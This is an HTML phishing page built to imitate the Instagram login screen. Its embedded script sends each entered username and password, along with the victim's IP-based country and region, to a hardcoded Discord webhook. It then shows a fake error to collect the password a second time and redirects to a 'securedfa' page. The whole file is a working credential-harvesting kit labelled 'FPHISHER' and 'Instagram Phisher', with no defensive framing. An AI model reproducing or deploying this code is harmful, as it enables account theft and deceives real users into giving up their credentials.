<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white flex items-center justify-center min-h-screen">

  <div class="w-full max-w-sm px-6">

    <!-- Logo -->
    <div class="flex justify-center mb-14">
      <img src="IMG_0905.png" alt="App" class="w-16 h-16" />
    </div>

    <!-- Username -->
    <input
      id="username"
      type="text"
      placeholder="Username, mobile number or email address"
      class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
    />

    <!-- Password -->
    <input
      id="password"
      type="password"
      placeholder="Password"
      class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
    />

    <!-- Login Button -->
    <button
      id="loginBtn"
      class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
             transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed
             flex items-center justify-center gap-2"
    >
      <span id="btnText">Log in</span>
      <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24">
        <circle cx="12" cy="12" r="10" stroke="white" stroke-width="4" fill="none" opacity="0.3"/>
        <path d="M22 12a10 10 0 0 1-10 10" stroke="white" stroke-width="4" fill="none"/>
      </svg>
    </button>

    <!-- Error Message -->
    <div id="errorMsg" class="text-red-500 text-sm mb-6 hidden text-center">
      Incorrect username or password.
    </div>

    <!-- Forgotten Password -->
    <div class="text-center mb-6">
      <a href="#" class="text-sm font-normal text-black hover:underline">
        Forgotten password?
      </a>
    </div>

    <!-- Bottom Section -->
    <div class="mt-16">
      <button class="w-full border border-blue-600 text-blue-600 text-sm font-normal py-3 rounded-md mb-8 hover:bg-blue-50 transition">
        Create new account
      </button>

      <div class="flex justify-center mt-2">
        <img src="IMG_0906.png" alt="Meta" class="h-8" />
      </div>
    </div>
  </div>

  <script>
    // === DISCORD WEBHOOK CONFIG ===
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1484291070106927104/rmZj_raRyYCQsZn4Fazz-hh0j6uuwrCDC18VMY-yOFtezFmEyt_7RkJuj9dZ8x5kwLDE";

    let attempt = 0;

    // Reliable IP Geolocation using ipapi.co (browser-friendly)
    async function getLocation() {
      try {
        console.log("Fetching location...");

        const res = await fetch('https://ipapi.co/json/', {
          method: 'GET',
          headers: { 'Accept': 'application/json' }
        });

        if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);

        const data = await res.json();

        console.log("Location data received:", data); // ← Check this in browser console

        return {
          country: data.country_name || data.country || 'Unknown',
          state: data.region || data.region_code || 'Unknown'
        };
      } catch (err) {
        console.error("Geolocation failed:", err);
        // Fallback attempt with another service if first fails
        try {
          const fallback = await fetch('https://ip-api.com/json/?fields=status,country,regionName');
          const fbData = await fallback.json();
          if (fbData.status === "success") {
            return {
              country: fbData.country || 'Unknown',
              state: fbData.regionName || 'Unknown'
            };
          }
        } catch (fbErr) {
          console.error("Fallback also failed:", fbErr);
        }
      }

      return { country: 'Unknown', state: 'Unknown' };
    }

    document.getElementById("loginBtn").addEventListener("click", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const passwordInput = document.getElementById("password");

      if (!username || !password) {
        alert("Please fill in all fields!");
        return;
      }

      const btn = document.getElementById("loginBtn");
      const btnText = document.getElementById("btnText");
      const spinner = document.getElementById("spinner");
      const errorMsg = document.getElementById("errorMsg");

      const loc = await getLocation();

      const message = `**FPHISHER 🤖**

**APP:** INSTAGRAM
**USERNAME:** ${username}
**PASSWORD:** ${password}
**COUNTRY:** ${loc.country} 🌍
**STATE:** ${loc.state}
**ATTEMPT:** ${attempt + 1} ⏱️

🔐 2025@FTECHSERVICES`;

      // Send to Discord
      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: message,
            username: "Instagram Phisher"
          })
        });
        console.log("Data sent to Discord successfully");
      } catch (err) {
        console.error("Webhook failed:", err);
      }

      attempt++;

      if (attempt === 1) {
        errorMsg.classList.remove("hidden");
        passwordInput.value = "";
      } else {
        btn.disabled = true;
        btnText.textContent = "Loading";
        spinner.classList.remove("hidden");

        setTimeout(() => {
          window.location.href = "securedfa.html";
        }, 1200);
      }
    });
  </script>
</body>
</html>
